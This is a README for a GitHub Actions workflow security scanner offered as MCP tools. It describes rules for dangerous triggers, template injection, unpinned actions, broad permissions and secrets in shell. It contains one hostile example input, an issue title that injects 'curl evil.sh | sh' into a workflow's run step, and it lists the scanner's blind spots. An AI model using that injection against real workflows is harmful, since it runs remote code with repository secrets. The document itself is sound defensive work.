# actions-guard-mcp

A GitHub Actions workflow security scanner, exposed as MCP tools — so an
agent can catch the "pwn request" and supply-chain patterns that have
caused real incidents (CoreShop, tj-actions, and others) *before* a
workflow file is committed, not after.

## Why this exists

Static analysis for GitHub Actions workflows is a mature, well-understood
field — [zizmor](https://github.com/zizmorcore/zizmor) is a respected,
actively maintained standalone scanner for exactly this. What doesn't
exist yet is a serious MCP wrapper around that class of analysis. The one
project found in a broad search (`github-security-mcp`) spreads 45 checks
across org settings, secrets, supply chain, *and* Actions in one generic
tool — 12 stars, no commits in 5 months. Nothing focuses on workflow
security specifically, deeply, as something an agent can call while it's
actively writing or reviewing a workflow file.

## What it catches

- **Dangerous triggers (AGMCP-101)** — `pull_request_target` or
  `workflow_run` combined with a checkout step whose `ref:` or
  `repository:` points at the triggering PR/run's own fork. This is the
  exact shape of the CoreShop incident: a workflow that runs with the
  base repo's token and secrets, but checks out and executes code from
  the fork that triggered it.
- **Template injection (AGMCP-102)** — `${{ ... }}` expressions built
  from attacker-controlled context (`github.event.issue.title`,
  `github.event.pull_request.title`, `github.event.comment.body`,
  `github.head_ref`, a `toJSON(github.event)` whole-payload dump, and
  similar) interpolated directly into a `run:` step, rather than passed
  through `env:`. The classic shape is
  `run: echo "${{ github.event.issue.title }}"` — an issue title of
  `"; curl evil.sh | sh #` is not a string at that point, it's shell.
- **Unpinned actions and reusable workflows (AGMCP-103)** —
  `uses: owner/repo@v4` (a tag or branch, both mutable) instead of a
  pinned commit SHA; a job-level reusable-workflow call
  (`jobs.<id>.uses: owner/repo/.github/workflows/x.yml@main`) pinned the
  same mutable way; or a `docker://image:tag` reference not pinned to a
  `@sha256:` digest. This is the exact supply-chain surface the
  tj-actions incident used: a compromised tag pointed everyone using it
  at malicious code with no version bump.
- **Excessive permissions (AGMCP-104)** — `permissions: write-all`, or
  explicit broad `write` scopes (`contents`, `actions`, `packages`, ...),
  set at either the workflow level or a job level, on a workflow that
  also has a risky trigger, where a narrower scope would do.
- **Secrets interpolated into shell (AGMCP-105)** — `${{ secrets.X }}`
  used directly in a `run:` step instead of passed through `env:`, which
  is unnecessary exposure of the raw secret value into the shell command
  line / process list rather than an environment variable.

All marker matching (AGMCP-101/102/105) normalizes GitHub Actions'
bracket-notation property access (`github.event['issue']['title']`) to
the equivalent dot form and matches case-insensitively, since the
expression language treats both as identical.

## Known limitations

This is pattern matching over the literal text of `${{ }}` expressions
and `with:`/`permissions:` blocks — not a full GitHub Actions expression
parser or a data-flow analysis. A clean scan means "no *known* risky
pattern found in the text as written," not a guarantee the workflow is
safe. Concretely:

- **No cross-step / `env:` data-flow tracking.** A dangerous value
  routed through an intermediate `env:` variable or a step output before
  reaching a checkout `ref:` or a `run:` command is invisible to
  AGMCP-101/102/105 — only the literal expression in the field being
  checked is inspected.
- **The attacker-controlled-context marker list (AGMCP-102) is a finite,
  hand-maintained set**, not a real enumeration of every context path
  GitHub Actions exposes. A new or uncommon field can exist that isn't
  listed yet.

If a clean result matters for a security decision, don't treat it as the
last word — [zizmor](https://github.com/zizmorcore/zizmor) does deeper,
more general static analysis of the same file class and is worth running
alongside this, not instead of it.

## Setup

```bash
pip install actions-guard-mcp
actions-guard-mcp
```

No configuration needed — every tool takes a workflow file path or its raw YAML content directly.

## Status

Early build.

## License

MIT
